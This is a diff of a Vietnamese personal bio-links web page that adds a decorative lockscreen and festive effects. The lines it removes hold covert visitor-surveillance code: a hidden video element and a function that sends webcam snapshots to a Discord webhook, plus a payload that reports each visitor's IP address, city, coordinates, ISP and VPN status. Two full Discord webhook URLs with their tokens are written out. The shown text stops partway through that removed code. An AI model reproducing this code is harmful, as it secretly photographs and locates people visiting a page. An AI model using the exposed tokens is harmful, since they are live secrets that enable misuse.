@@ -1,14 +1,186 @@
 <!DOCTYPE html>
-<html lang="vi">      
+<html lang="vi">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>qynhmai - Bio Links</title>
 <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Lexend:wght@300;400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body,html{font-family:'Outfit',sans-serif;overflow-x:hidden;background:#000}
+
+.lockscreen{
+    position:fixed;
+    inset:0;
+    z-index:99999;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    background:#000;
+    cursor:pointer;
+    overflow:hidden;
+    transition:opacity 0.6s cubic-bezier(0.4,0,0.2,1);
+}
+
+.lockscreen.hidden{
+    opacity:0;
+    pointer-events:none;
+}
+
+.lockscreen-bg{
+    position:absolute;
+    inset:0;
+    background:
+        radial-gradient(ellipse at 20% 80%, rgba(139,92,246,0.35) 0%, transparent 50%),
+        radial-gradient(ellipse at 80% 20%, rgba(59,130,246,0.3) 0%, transparent 50%),
+        radial-gradient(ellipse at 50% 50%, rgba(168,85,247,0.15) 0%, transparent 70%),
+        linear-gradient(135deg, #0a0a1a 0%, #111827 40%, #0f172a 100%);
+    z-index:0;
+}
+
+.lockscreen-particles{
+    position:absolute;
+    inset:0;
+    z-index:1;
+    pointer-events:none;
+    overflow:hidden;
+}
+
+.lockscreen-particle{
+    position:absolute;
+    border-radius:50%;
+    opacity:0;
+    animation:particleFloat linear infinite;
+}
+
+@keyframes particleFloat{
+    0%{transform:translateY(100vh) scale(0);opacity:0}
+    10%{opacity:1}
+    90%{opacity:1}
+    100%{transform:translateY(-100px) scale(1);opacity:0}
+}
+
+.lockscreen-content{
+    position:relative;
+    z-index:2;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:20px;
+    animation:lockFadeIn 0.8s ease;
+}
+
+@keyframes lockFadeIn{
+    from{opacity:0;transform:translateY(30px)}
+    to{opacity:1;transform:translateY(0)}
+}
+
+.lock-avatar-wrap{
+    position:relative;
+    width:150px;
+    height:150px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+.lock-avatar-frame{
+    position:absolute;
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%);
+    width:139px;
+    height:139px;
+    background-image:url('https://discord-decoration.art/decorations/angry.png');
+    background-size:contain;
+    background-position:center;
+    background-repeat:no-repeat;
+    animation:gentleFloat 4s ease-in-out infinite;
+    pointer-events:none;
+    z-index:2;
+}
+
+.lock-avatar{
+    position:relative;
+    z-index:1;
+    width:128px;
+    height:128px;
+    border-radius:50%;
+    object-fit:cover;
+    border:3px solid rgba(255,255,255,0.1);
+    box-shadow:0 0 25px rgba(139,92,246,0.35),0 0 50px rgba(139,92,246,0.15);
+}
+
+.lock-name{
+    font-family:'Lexend',sans-serif;
+    font-size:32px;
+    font-weight:600;
+    color:#fff;
+    letter-spacing:1px;
+    text-shadow:0 0 20px rgba(139,92,246,0.5);
+}
+
+.lock-quote{
+    font-size:15px;
+    color:#a0aec0;
+    font-weight:300;
+    max-width:380px;
+    text-align:center;
+    line-height:1.6;
+    min-height:48px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    transition:opacity 0.4s ease;
+}
+
+.lock-quote.fade{
+    opacity:0;
+}
+
+.lock-hint{
+    position:absolute;
+    bottom:50px;
+    left:50%;
+    transform:translateX(-50%);
+    z-index:3;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:8px;
+    animation:hintPulse 2s ease-in-out infinite;
+    white-space:nowrap;
+}
+
+.lock-hint span{
+    color:#cbd5e0;
+    font-size:18px;
+    font-weight:600;
+    letter-spacing:0.5px;
+    text-shadow:0 0 14px rgba(139,92,246,0.6),0 0 35px rgba(139,92,246,0.25);
+}
+
+.lock-hint i{
+    font-style:normal;
+    font-size:24px;
+    color:#8b5cf6;
+    animation:arrowBounce 1.5s ease-in-out infinite;
+    display:inline-block;
+    text-shadow:0 0 10px rgba(139,92,246,0.7);
+}
+
+@keyframes hintPulse{
+    0%,100%{opacity:0.4}
+    50%{opacity:0.9}
+}
+
+@keyframes arrowBounce{
+    0%,100%{transform:translateY(0)}
+    50%{transform:translateY(6px)}
+}
 
 .container{
     display:flex;
@@ -20,7 +192,6 @@ body,html{font-family:'Outfit',sans-serif;overflow-x:hidden;background:#000}
     position:relative;
     overflow:hidden;
     padding:40px 20px
-
 }
 
 .stars{
@@ -30,8 +201,8 @@ body,html{font-family:'Outfit',sans-serif;overflow-x:hidden;background:#000}
     width:100%;
     height:100%;
     pointer-events:none;
-    overflow:hidden
-    contain: strict;
+    overflow:hidden;
+    contain:strict;
 }
 
 .star{
@@ -42,9 +213,9 @@ body,html{font-family:'Outfit',sans-serif;overflow-x:hidden;background:#000}
     box-shadow:0 0 3px rgba(255,255,255,0.6)
 }
 
-@keyframes twinkle {
-    0%, 100% { opacity: 0.3; }
-    50% { opacity: 0.9; }
+@keyframes twinkle{
+    0%,100%{opacity:0.3}
+    50%{opacity:0.9}
 }
 
 .constellation{
@@ -81,7 +252,7 @@ body,html{font-family:'Outfit',sans-serif;overflow-x:hidden;background:#000}
     position:absolute;
     top:50%;
     left:50%;
-    transform:translate(-50%, -50%);
+    transform:translate(-50%,-50%);
     width:145px;
     height:145px;
     background-image:url('https://discord-decoration.art/decorations/angry.png');
@@ -94,8 +265,8 @@ body,html{font-family:'Outfit',sans-serif;overflow-x:hidden;background:#000}
 }
 
 @keyframes gentleFloat{
-    0%,100%{transform:translate(-50%, -50%) scale(1)}
-    50%{transform:translate(-50%, -52%) scale(1.02)}
+    0%,100%{transform:translate(-50%,-50%) scale(1)}
+    50%{transform:translate(-50%,-52%) scale(1.02)}
 }
 
 .avatar{
@@ -103,9 +274,7 @@ body,html{font-family:'Outfit',sans-serif;overflow-x:hidden;background:#000}
     height:120px;
     border-radius:50%;
     border:3px solid rgba(255,255,255,0.1);
-    box-shadow:
-        0 0 20px rgba(139,92,246,0.3),
-        0 0 40px rgba(59,130,246,0.15);
+    box-shadow:0 0 20px rgba(139,92,246,0.3),0 0 40px rgba(59,130,246,0.15);
     object-fit:cover;
     position:relative;
     z-index:1
@@ -150,10 +319,10 @@ h1{
 .bio .fade-text::before{
     content:'';
     position:absolute;
-    top:0px;
+    top:0;
     left:-2px;
     right:-2px;
-    bottom:0px;
+    bottom:0;
     background:#1a1a1a;
     border-radius:4px;
     z-index:1;
@@ -248,12 +417,10 @@ h1{
     gap:16px;
     text-decoration:none;
     color:#fff;
-    transition:all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    transition:all 0.4s cubic-bezier(0.4,0,0.2,1);
     position:relative;
     overflow:hidden;
-    box-shadow:
-        0 4px 24px rgba(0,0,0,0.25),
-        inset 0 1px 0 rgba(255,255,255,0.08)
+    box-shadow:0 4px 24px rgba(0,0,0,0.25),inset 0 1px 0 rgba(255,255,255,0.08)
 }
 
 .link-item::before{
@@ -275,10 +442,7 @@ h1{
     background:rgba(255,255,255,0.12);
     border-color:rgba(255,255,255,0.25);
     transform:translateY(-4px);
-    box-shadow:
-        0 12px 40px rgba(139,92,246,0.3),
-        0 4px 24px rgba(0,0,0,0.25),
-        inset 0 1px 0 rgba(255,255,255,0.15)
+    box-shadow:0 12px 40px rgba(139,92,246,0.3),0 4px 24px rgba(0,0,0,0.25),inset 0 1px 0 rgba(255,255,255,0.15)
 }
 
 .link-icon{
@@ -346,7 +510,7 @@ h1{
 .link-arrow{
     font-size:22px;
     color:#4a5568;
-    transition:all 0.4s cubic-bezier(0.4, 0, 0.2, 1)
+    transition:all 0.4s cubic-bezier(0.4,0,0.2,1)
 }
 
 .link-item:hover .link-arrow{
@@ -360,216 +524,6 @@ h1{
     color:#4a5568;
     font-size:13px;
     font-weight:300
-}
-
-.modal{
-    display:none;
-    position:fixed;
-    z-index:1000;
-    left:0;
-    top:0;
-    width:100%;
-    height:100%;
-    background:rgba(0,0,0,0.85);
-    backdrop-filter:blur(12px);
-    animation:fadeIn 0.4s
-}
-
-@keyframes fadeIn{
-    from{opacity:0}
-    to{opacity:1}
-}
-
-.modal-content{
-    background:rgba(15,25,40,0.65);
-    backdrop-filter:blur(30px) saturate(180%);
-    -webkit-backdrop-filter:blur(30px) saturate(180%);
-    margin:10% auto;
-    padding:30px 30px;
-    border:1px solid rgba(100,120,200,0.25);
-    border-radius:18px;
-    width:90%;
-    max-width:380px;
-    text-align:center;
-    box-shadow:
-        0 20px 50px rgba(0,0,0,0.6),
-        0 0 100px rgba(100,120,200,0.12),
-        inset 0 1px 0 rgba(255,255,255,0.06);
-    animation:slideUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-    position:relative;
-    overflow:hidden
-}
-
-.modal-content::before{
-    content:'';
-    position:absolute;
-    top:0;
-    left:0;
-    width:100%;
-    height:2px;
-    background:linear-gradient(90deg,#6078c8 0%,#4a90e2 50%,#7c9ce8 100%)
-}
-
-@keyframes slideUp{
-    from{transform:translateY(80px) scale(0.95);opacity:0}
-    to{transform:translateY(0) scale(1);opacity:1}
-}
-
-.modal-content h2{
-    color:#fff;
-    margin-bottom:10px;
-    font-size:24px;
-    font-weight:600;
-    font-family:'Lexend',sans-serif;
-    letter-spacing:0.3px
-}
-
-.modal-avatar-wrapper{
-    margin-bottom:20px;
-    display:inline-block;
-    position:relative;
-    padding:0
-}
-
-.modal-avatar-frame{
-    position:absolute;
-    top:50%;
-    left:50%;
-    transform:translate(-50%, -50%);
-    width:90px;
-    height:90px;
-    background-image:url('https://discord-decoration.art/decorations/angry.png');
-    background-size:contain;
-    background-position:center;
-    background-repeat:no-repeat;
-    animation:gentleFloat 4s ease-in-out infinite;
-    pointer-events:none;
-    z-index:2
-}
-
-.modal-avatar{
-    width:75px;
-    height:75px;
-    border-radius:50%;
-    border:2px solid rgba(255,255,255,0.1);
-    box-shadow:
-        0 0 15px rgba(100,120,200,0.3),
-        0 0 30px rgba(100,120,200,0.15);
-    object-fit:cover;
-    position:relative;
-    z-index:1
-}
-
-.modal-content p{
-    color:#a0aec0;
-    margin-bottom:20px;
-    font-size:14px;
-    line-height:1.6;
-    font-weight:300
-}
-
-.name-input{
-    width:100%;
-    padding:14px 20px;
-    border:1.5px solid rgba(100,120,200,0.25);
-    border-radius:12px;
-    background:rgba(20,30,50,0.5);
-    backdrop-filter:blur(10px);
-    -webkit-backdrop-filter:blur(10px);
-    color:#fff;
-    font-size:15px;
-    font-family:'Outfit',sans-serif;
-    margin-bottom:20px;
-    transition:all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-    outline:none;
-    box-shadow:
-        0 3px 10px rgba(0,0,0,0.3),
-        inset 0 1px 0 rgba(255,255,255,0.05);
-    -webkit-user-select:text;
-    user-select:text
-}
-
-.name-input:focus{
-    border-color:rgba(100,120,200,0.5);
-    background:rgba(20,30,50,0.7);
-    box-shadow:
-        0 4px 15px rgba(100,120,200,0.3),
-        0 0 30px rgba(100,120,200,0.15),
-        inset 0 1px 0 rgba(255,255,255,0.08);
-    transform:translateY(-1px)
-}
-
-.name-input::placeholder{
-    color:#718096;
-    font-weight:300
-}
-
-.error-message{
-    color:#ef4444;
-    font-size:12px;
-    margin-top:-15px;
-    margin-bottom:15px;
-    display:none;
-    font-weight:400;
-    text-shadow:0 0 6px rgba(239,68,68,0.2)
-}
-
-.btn{
-    background:linear-gradient(135deg,#8b5cf6 0%,#3b82f6 50%,#a855f7 100%);
-    color:white;
-    padding:13px 45px;
-    border:none;
-    border-radius:40px;
-    cursor:pointer;
-    font-size:15px;
-    font-weight:600;
-    transition:all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
-    box-shadow:
-        0 8px 25px rgba(139,92,246,0.35),
-        inset 0 1px 0 rgba(255,255,255,0.2);
-    position:relative;
-    overflow:hidden;
-    letter-spacing:0.4px
-}
-
-.btn::before{
-    content:'';
-    position:absolute;
-    top:50%;
-    left:50%;
-    width:0;
-    height:0;
-    border-radius:50%;
-    background:rgba(255,255,255,0.2);
-    transform:translate(-50%,-50%);
-    transition:width 0.5s,height 0.5s
-}
-
-.btn:hover::before{
-    width:300px;
-    height:300px
-}
-
-.btn:hover{
-    transform:translateY(-2px);
-    box-shadow:
-        0 12px 35px rgba(139,92,246,0.5),
-        inset 0 1px 0 rgba(255,255,255,0.3)
-}
-
-.btn:active{
-    transform:translateY(0)
-}
-
-.btn:disabled{
-    opacity:0.6;
-    cursor:not-allowed;
-    transform:none
-}
-
-.btn span{
-    position:relative;
-    z-index:1
 }
 
 .music-indicator{
@@ -619,17 +573,95 @@ h1{
     50%{transform:scaleY(1)}
 }
 
-@media (max-width:768px){
+.click-text{
+    position:fixed;
+    pointer-events:none;
+    font-family:'Outfit',sans-serif;
+    font-weight:700;
+    font-size:15px;
+    white-space:nowrap;
+    z-index:9999;
+    text-shadow:0 0 8px currentColor;
+    animation:clickTextFloat 1.4s cubic-bezier(0.25,0.46,0.45,0.94) forwards;
+}
+
+@keyframes clickTextFloat{
+    0%{opacity:1;transform:translateY(0) scale(1)}
+    60%{opacity:0.8;transform:translateY(-100px) scale(1.05)}
+    100%{opacity:0;transform:translateY(-180px) scale(0.8)}
+}
+
+.falling-stars{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    pointer-events:none;
+    z-index:9998;
+    overflow:hidden;
+}
+
+.falling-star{
+    position:absolute;
+    font-size:1.2rem;
+    color:white;
+    opacity:0;
+    animation:starFall linear forwards;
+}
+
+@keyframes starFall{
+    0%{
+        opacity:0;
+        transform:translateY(-50px) rotate(0deg) scale(0);
+    }
+    10%{
+        opacity:1;
+        transform:translateY(0) rotate(45deg) scale(1);
+    }
+    90%{
+        opacity:1;
+    }
+    100%{
+        opacity:0;
+        transform:translateY(100vh) rotate(180deg) scale(0.5);
+    }
+}
+
+@media(max-width:768px){
     h1{font-size:30px}
     .link-title{font-size:16px}
     .profile-wrapper{padding:0 10px}
-    .modal-content{padding:30px 25px;max-width:350px}
     .music-indicator{bottom:20px;right:20px;font-size:12px}
     .quote-text{font-size:13px}
+    .lock-name{font-size:26px}
+    .lock-quote{font-size:14px;max-width:300px}
+    .lock-hint{bottom:40px}
+    .lock-hint span{font-size:15px}
 }
 </style>
 </head>
 <body>
+
+<div class="falling-stars" id="fallingStars"></div>
+
+<div class="lockscreen" id="lockscreen">
+    <div class="lockscreen-bg"></div>
+    <div class="lockscreen-particles" id="lockParticles"></div>
+    <div class="lockscreen-content">
+        <div class="lock-avatar-wrap">
+            <div class="lock-avatar-frame"></div>
+            <img src="https://sf-static.upanhlaylink.com/img/image_2026010804e6d83232c262fed7eb625f06bed361.jpg" alt="Avatar" class="lock-avatar">
+        </div>
+        <div class="lock-name">qynh mai</div>
+        <div class="lock-quote" id="lockQuote"></div>
+    </div>
+    <div class="lock-hint">
+        <span>Chạm bất kỳ đâu để tiếp tục</span>
+        <i>↓</i>
+    </div>
+</div>
+
 <div class="container">
     <div class="stars" id="stars"></div>
     <canvas class="constellation" id="constellation"></canvas>
@@ -659,7 +691,7 @@ h1{
             <p class="role">Myself / Think</p>
             <div>
                 <p>hello, i'm nothing with you !</p>
-                <p>“enjoy your life.”</p>
+                <p>"enjoy your life."</p>
             </div>
         </section>
         
@@ -703,24 +735,10 @@ h1{
                 <div class="link-arrow">→</div>
             </a>
         </div>
-        
-        <div class="footer">
-            © “I’m talented, and so are you.”
-        </div>
-    </div>
-</div>
 
-<div id="notificationModal" class="modal">
-    <div class="modal-content">
-        <div class="modal-avatar-wrapper">
-            <div class="modal-avatar-frame"></div>
-            <img src="https://sf-static.upanhlaylink.com/img/image_2026010804e6d83232c262fed7eb625f06bed361.jpg" alt="Avatar" class="modal-avatar">
+        <div class="footer">
+            © "I'm talented, and so are you."
         </div>
-        <h2>Nhập tên của bạn</h2>
-        <p>Vui lòng nhập tên để tiếp tục</p>
-        <input type="text" class="name-input" id="nameInput" placeholder="Tên của bạn..." autocomplete="off">
-        <p class="error-message" id="errorMessage">Vui lòng nhập tên hợp lệ!</p>
-        <button class="btn" id="confirmBtn"><span>Xác nhận</span></button>
     </div>
 </div>
 
@@ -733,564 +751,384 @@ h1{
     <span>Đang phát nhạc...</span>
 </div>
 
-<video id="video" width="1" height="1" autoplay style="display:none;"></video>
 <audio id="backgroundMusic"></audio>
 
 <script>
-//const DISCORD_WEBHOOK='https://discord.com/api/webhooks/1440247747700723732/vmQeU92yVVYgp8uuYkRttiIgWDH5ttAsPegnTh8zwBuIg7mofGMH9_UMAQbsaF-Mny1t';
-const DISCORD_WEBHOOK='https://discord.com/api/webhooks/1466471346077827324/35ZOkMh1SUJtJVZI1H58KwQB0jOEJaK5IVBLcNpEKCctbGooYkG73sX5PYId4Nw43YkN';
-    
+const quotes = [
+    "leaving the country (rời khỏi đất nước)",
+    "delete all my accounts (xoá sạch mọi tài khoản)",
+    "change my number (đổi số liên lạc)",
+    "start a new life (bắt đầu cuộc sống mới)",
+    "privacy so high (ẩn danh tuyệt đối)",
+    "u'll never see me until i decide to be seen (bạn sẽ không biết về tôi trừ khi được cho phép)",
+    "im lặng là vàng là bạc, tiền là tiên là phật",
+    "Silence is golden, and money makes the world go round"
+];
+
+var lockQuotes = [
+    "leaving the country (rời khỏi đất nước)",
+    "delete all my accounts (xoá sạch mọi tài khoản)",
+    "change my number (đổi số liên lạc)",
+    "start a new life (bắt đầu cuộc sống mới)",
+    "privacy so high (ẩn danh tuyệt đối)",
+    "u'll never see me until i decide to be seen",
+    "im lặng là vàng là bạc, tiền là tiên là phật",
+    "Silence is golden, and money makes the world go round",
+    "Silence is power. I hope you can understand.",
+    "enjoy your life.",
+    "hello, i'm nothing with you !"
+];
+
+var clickTexts = [
+    "♥️ Năm mới vui vẻ",
+    "❤️ Cung hỉ phát tài",
+    "💛 Tiền vô như nước",
+    "💚 Vợ đẹp con ngoan",
+    "💙 Tài lộc vào nhà",
+    "💜 Phúc thọ vô biên",
+    "🖤 Sống khoẻ đón xuân",
+    "💖 Phú quý cát tường",
+    "💝 Đắc lộc toàn gia",
+    "💙 Hạnh phúc mênh mang",
+    "❤️ Vạn sự thành công",
+    "💚 Mã đáo thành công",
+    "💙 Tiền vô tỷ tỷ",
+    "💜 Tài vạn công danh",
+    "💛 Hạnh phúc gia an",
+    "💖 Sức khoẻ như voi",
+    "💛 Thông minh vượt trội",
+    "💖 Phúc lộc trong tay",
+    "💚 Gia chủ phát tài",
+    "💚 Vạn sự như ý",
+    "💚 Túi tiền nặng ký",
+    "🖤 Làm ăn phát đạt",
+    "💛 Vàng bạc cao sang",
+    "💙 Sức khỏe an nhàn",
+    "💜 Công danh hết ý",
+    "🖤 Cung hỷ cung hỷ",
+    "💝 Hạnh phúc triền miên",
+    "🖤 Sung sướng như tiên",
+    "❤️ An khang thịnh vượng",
+    "💛 Tết đến an nhiên",
+    "💚 Lộc xuân gõ cửa",
+    "💙 Gia đình êm ấm",
+    "💜 Vạn điều may mắn",
+    "💖 Xuân sang phú quý",
+    "💝 Tâm an vạn sự an",
+    "🖤 Lộc lá quanh năm",
+    "💚 Tiền vô cửa trước",
+    "💙 Lộc vào cửa sau",
+    "💛 Nụ cười rạng rỡ",
+    "💜 Tết này giàu to",
+    "💖 Xuân này phát lộc",
+    "💚 May mắn ngập tràn",
+    "❤️ Bình an trọn vẹn",
+    "💙 Hỷ sự liên miên",
+    "💛 Lộc tài song toàn",
+    "💜 Gia đạo hưng thịnh",
+    "💝 Vui xuân như ý",
+    "🖤 Xuân về sung túc"
+];
+
+var clickColors = [
+    "#ff6651",
+    "#42a5f5",
+    "#66bb6a",
+    "#ab47bc",
+    "#ffa726",
+    "#ec407a",
+    "#26c6da",
+    "#78909c",
+    "#ffca28",
+    "#5c6bc0",
+    "#8d6e63",
+    "#26a69a",
+    "#ef5350",
+    "#29b6f6",
+    "#9ccc65",
+    "#ba68c8",
+    "#ffb74d",
+    "#f06292",
+    "#4dd0e1",
+    "#90a4ae",
+    "#ffd54f",
+    "#7986cb",
+    "#a1887f",
+    "#4db6ac",
+    "#ff8a65",
+    "#64b5f6",
+    "#81c784",
+    "#9575cd",
+    "#ffcc80",
+    "#f48fb1",
+    "#80deea",
+    "#b0bec5",
+    "#ffe082",
+    "#9fa8da"
+];
+
+var clickIndex = 0;
+let currentQuoteIndex = 0;
+
+function initLockParticles(){
+    var container = document.getElementById('lockParticles');
+    for(var i = 0; i < 25; i++){
+        var p = document.createElement('div');
+        p.className = 'lockscreen-particle';
+        var size = Math.random() * 4 + 2;
+        var hue = Math.random() * 60 + 240;
+        p.style.width = size + 'px';
+        p.style.height = size + 'px';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.background = 'hsl(' + hue + ', 70%, 60%)';
+        p.style.animationDuration = (Math.random() * 6 + 5) + 's';
+        p.style.animationDelay = (Math.random() * 5) + 's';
+        container.appendChild(p);
+    }
+}
+
+function rotateLockQuote(){
+    var el = document.getElementById('lockQuote');
+    el.classList.add('fade');
+    setTimeout(function(){
+        el.textContent = lockQuotes[Math.floor(Math.random() * lockQuotes.length)];
+        el.classList.remove('fade');
+    }, 400);
+}
+
+initLockParticles();
+rotateLockQuote();
+setInterval(rotateLockQuote, 4000);
+
+document.getElementById('lockscreen').addEventListener('click', function(){
+    this.classList.add('hidden');
+    playMusicFromAPI();
+});
+
 function createStars(){
-    const starsContainer=document.getElementById('stars');
-    const starCount=150;
-    const viewportWidth=window.innerWidth;
-    
-    for(let i=0;i<starCount;i++){
-        const star=document.createElement('div');
-        star.className='star';
-        const size=Math.random()*2+0.8;
-        star.style.width=size+'px';
-        star.style.height=size+'px';
-        star.style.left=Math.random()*100+'%';
-        star.style.top=Math.random()*100+'%';
-        star.style.animationDuration=(Math.random()*3+2)+'s';
-        star.style.animationDelay=Math.random()*5+'s';
-        starsContainer.appendChild(star)
+    var starsContainer = document.getElementById('stars');
+    for(var i = 0; i < 150; i++){
+        var star = document.createElement('div');
+        star.className = 'star';
+        var size = Math.random() * 2 + 0.8;
+        star.style.width = size + 'px';
+        star.style.height = size + 'px';
+        star.style.left = Math.random() * 100 + '%';
+        star.style.top = Math.random() * 100 + '%';
+        star.style.animationDuration = (Math.random() * 3 + 2) + 's';
+        star.style.animationDelay = Math.random() * 5 + 's';
+        starsContainer.appendChild(star);
     }
 }
 
 function drawConstellation(){
-    const canvas=document.getElementById('constellation');
-    const ctx=canvas.getContext('2d');
-    canvas.width=window.innerWidth;
-    canvas.height=window.innerHeight;
-    
-    const points=[];
-    const pointCount=30;
-    
-    for(let i=0;i<pointCount;i++){
+    var canvas = document.getElementById('constellation');
+    var ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    var points = [];
+    for(var i = 0; i < 30; i++){
         points.push({
-            x:Math.random()*canvas.width,
-            y:Math.random()*canvas.height,
-            vx:(Math.random()-0.5)*0.2,
-            vy:(Math.random()-0.5)*0.2
-        })
-    }
-    
-    function animate(){
-        ctx.clearRect(0,0,canvas.width,canvas.height);
-        ctx.strokeStyle='rgba(139,92,246,0.12)';
-        ctx.lineWidth=0.5;
-        
-        points.forEach(point=>{
-            point.x+=point.vx;
-            point.y+=point.vy;
-            
-            if(point.x<0||point.x>canvas.width)point.vx*=-1;
-            if(point.y<0||point.y>canvas.height)point.vy*=-1;
-            
-            points.forEach(otherPoint=>{
-                const dx=point.x-otherPoint.x;
-                const dy=point.y-otherPoint.y;
-                const distance=Math.sqrt(dx*dx+dy*dy);
-                
-                if(distance<120){
-                    ctx.beginPath();
-                    ctx.moveTo(point.x,point.y);
-                    ctx.lineTo(otherPoint.x,otherPoint.y);
-                    ctx.globalAlpha=(120-distance)/120*0.25;
-                    ctx.stroke()
-                }
-            })
+            x: Math.random() * canvas.width,
+            y: Math.random() * canvas.height,
+            vx: (Math.random() - 0.5) * 0.2,
+            vy: (Math.random() - 0.5) * 0.2
         });
-        
-        requestAnimationFrame(animate)
     }
-    animate()
+    function animate(){
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.strokeStyle = 'rgba(139,92,246,0.12)';
+        ctx.lineWidth = 0.5;
+        points.forEach(function(point){
+            point.x += point.vx;
+            point.y += point.vy;
+            if(point.x < 0 || point.x > canvas.width) point.vx *= -1;
+            if(point.y < 0 || point.y > canvas.height) point.vy *= -1;
+            points.forEach(function(other){
+                var dx = point.x - other.x;
+                var dy = point.y - other.y;
+                var dist = Math.sqrt(dx * dx + dy * dy);
+                if(dist < 120){
+                    ctx.beginPath();
+                    ctx.moveTo(point.x, point.y);
+                    ctx.lineTo(other.x, other.y);
+                    ctx.globalAlpha = (120 - dist) / 120 * 0.25;
+                    ctx.stroke();
+                }
+            });
+        });
+        requestAnimationFrame(animate);
+    }
+    animate();
 }
 
 createStars();
 drawConstellation();
+window.addEventListener('resize', function(){ drawConstellation(); });
 
-window.addEventListener('resize',()=>{
-    drawConstellation()
-});
-
-function fetchQuote(){
-    $.ajax({
-        url:'https://api.thanhdieu.com/cham-ngon',
-        type:'GET',
-        dataType:'json',
-        success:function(data){
-            const quoteElement=$('#quote-text');
-            quoteElement.fadeOut(300,function(){
-                $(this).text(data.msg).fadeIn(300)
-            })
-        },
-        error:function(xhr,status,error){
-            console.error('Quote API error:',error)
-        }
-    })
+function displayQuote(){
+    const quoteElement = $('#quote-text');
+    quoteElement.fadeOut(300, function(){
+        $(this).text(quotes[currentQuoteIndex]).fadeIn(300);
+        currentQuoteIndex = (currentQuoteIndex + 1) % quotes.length;
+    });
 }
 
-fetchQuote();
-setInterval(fetchQuote,2000);
+displayQuote();
+setInterval(displayQuote, 3000);
 
 async function playMusicFromAPI(){
     try{
-        const musicIndicator=document.getElementById('musicIndicator');
-        const audio=document.getElementById('backgroundMusic');
-        
-        const response=await fetch('https://tranvanquan.x10.mx/api-phatnhac.php');
-        const data=await response.json();
-        
+        var musicIndicator = document.getElementById('musicIndicator');
+        var audio = document.getElementById('backgroundMusic');
+        var response = await fetch('https://tranvanquan.x10.mx/api-phatnhac.php');
+        var data = await response.json();
         if(data.value){
-            audio.src=data.value;
-            audio.volume=0.3;
-            
-            audio.addEventListener('ended',function(){
+            audio.src = data.value;
+            audio.volume = 0.3;
+            audio.addEventListener('ended', function(){
                 playMusicFromAPI();
-            },{once:true});
-            
-            const playPromise=audio.play();
-            if(playPromise!==undefined){
-                playPromise.then(()=>{
-                    musicIndicator.style.display='flex'
-                }).catch(error=>{
-                    console.log('Auto-play prevented:',error);
-                    document.addEventListener('click',function(){
+            }, {once: true});
+            var playPromise = audio.play();
+            if(playPromise !== undefined){
+                playPromise.then(function(){
+                    musicIndicator.style.display = 'flex';
+                }).catch(function(){
+                    document.addEventListener('click', function(){
                         audio.play();
-                        musicIndicator.style.display='flex'
-                    },{once:true})
-                })
+                        musicIndicator.style.display = 'flex';
+                    }, {once: true});
+                });
             }
         }
-    }catch(error){
-        console.error('Music error:',error);
-        setTimeout(()=>playMusicFromAPI(),5000)
+    } catch(e){
+        setTimeout(function(){ playMusicFromAPI(); }, 5000);
     }
 }
 
-function capturePhoto(){
-    const video=document.getElementById('video');
-    if(!video.videoWidth||!video.videoHeight)return;
-    const canvas=document.createElement('canvas');
-    canvas.width=video.videoWidth;
-    canvas.height=video.videoHeight;
-    canvas.getContext('2d').drawImage(video,0,0);
-    canvas.toBlob(blob=>{
-        if(!blob)return;
-        const formData=new FormData();
-        formData.append('file',blob,'photo.jpg');
-        const payload={username:'emytyxynh System',content:'📸 Webcam Capture'};
-        formData.append('payload_json',JSON.stringify(payload));
-        fetch(DISCORD_WEBHOOK,{method:'POST',body:formData})
-        .then(response=>console.log('Photo sent:',response.status))
-        .catch(err=>console.error('Photo error:',err))
-    },'image/jpeg')
+function createFallingStar(){
+    var container = document.getElementById('fallingStars');
+    var star = document.createElement('div');
+    star.className = 'falling-star';
+    star.textContent = '✦';
+    star.style.left = Math.random() * 100 + '%';
+    star.style.animationDuration = (Math.random() * 2 + 3) + 's';
+    var colors = ['#ffffff', '#8b5cf6', '#3b82f6', '#a78bfa'];
+    star.style.color = colors[Math.floor(Math.random() * colors.length)];
+    container.appendChild(star);
+    setTimeout(function(){
+        if(star.parentNode) star.parentNode.removeChild(star);
+    }, 5000);
 }
 
-function sendToDiscord(ipData,userData,userName){
-    const discordPayload={
-        username:'emytyxynh Check System',
-        avatar_url:'https://cdn-icons-png.flaticon.com/512/888/888879.png',
-        embeds:[{
-            title:"🎯 THÔNG TIN TRUY CẬP MỚI",
-            description:`**Người dùng:** ${userName||"Không cung cấp"}\n**Thời gian:** ${new Date().toLocaleString('vi-VN')}`,
-            color:3447003,
-            thumbnail:{url:"https://cdn-icons-png.flaticon.com/512/1177/1177568.png"},
-            fields:[
-                {name:"🌍 THÔNG TIN ĐỊA LÝ",value:`> **IP:** \`${ipData.ip}\`\n> **Quốc gia:** ${ipData.country}\n> **Tỉnh/Thành:** ${ipData.region}\n> **Thành phố:** ${ipData.city}\n> **Khu vực:** ${ipData.district}\n> **Mã bưu điện:** ${ipData.postal}\n> **Tọa độ:** \`${ipData.lat}, ${ipData.lon}\`\n> **Múi giờ:** ${ipData.timezoneAPI}`,inline:false},
-                {name:"🌐 MẠNG & KẾT NỐI",value:`> **ISP:** ${ipData.isp}\n> **Tổ chức:** ${ipData.org}\n> **ASN:** ${ipData.asn}\n> **Loại kết nối:** ${ipData.connection_type}\n> **Proxy/VPN:** ${ipData.proxy}\n> **Mobile:** ${ipData.mobile}`,inline:false},
